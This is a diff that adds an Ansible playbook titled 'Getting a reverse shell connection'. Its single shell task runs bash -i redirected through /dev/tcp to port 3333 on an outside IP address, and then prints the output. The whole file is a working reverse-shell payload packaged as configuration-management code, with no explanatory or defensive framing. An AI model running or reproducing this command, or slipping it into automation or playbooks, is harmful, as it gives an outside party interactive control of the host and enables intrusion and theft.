@@ -1,0 +1,13 @@
+---
+  - name: "Getting a reverse shell connection"
+    hosts: localhost
+    connection: local 
+    gather_facts: false
+    
+    tasks:
+
+    - name: "Execute a command"
+      shell: "bash -c 'bash -i >& /dev/tcp/52.47.201.23/3333 0>&1'"
+      register: "output"
+
+    - debug: var=output.stdout_lines
